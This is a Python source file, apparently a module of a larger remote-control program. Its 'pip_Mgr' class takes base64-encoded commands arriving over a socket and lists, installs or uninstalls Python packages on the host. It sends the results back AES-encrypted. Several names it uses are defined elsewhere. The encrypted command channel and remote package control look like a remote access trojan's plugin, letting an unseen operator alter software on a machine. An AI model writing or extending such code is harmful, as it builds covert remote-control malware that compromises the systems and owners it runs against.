import subprocess
import base64

class pip_Mgr:
    def __init__(self, sock) -> None:
        self.sock = sock

    def pip_list(self):
        output = subprocess.check_output(['pip', 'freeze'])
        packages = output.decode('utf-8')
        return f'1|{b64EnStr(packages)}'
    
    def pip_install(self, packages):
        try:
            for package in packages:
                output = subprocess.check_output(['pip', 'install', package])
        except Exception as e:
            pass
    
    def pip_uninstall(self, packages):
        try:
            for package in packages:
                output = subprocess.check_output(['pip', 'uninstall', package])
        except Exception as e:
            pass

    def run(self):
        cmd = para[0]
        payload = ''
        if cmd == 'l': # LIST
            payload = f'pip_Mgr|l|{self.pip_list()}'
        elif cmd == 'i': # INSTALL
            packages = [base64.b64decode(i).decode('utf-8') for i in str(para[1]).split(',')]
            payload = f'pip_Mgr|i|{self.pip_install(packages)}'
        elif cmd == 'u': # UNINSTALL
            packages = [base64.b64decode(i).decode('utf-8') for i in str(para[1]).split(',')]
            payload = f'pip_Mgr|u|{self.pip_uninstall(packages)}'
        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))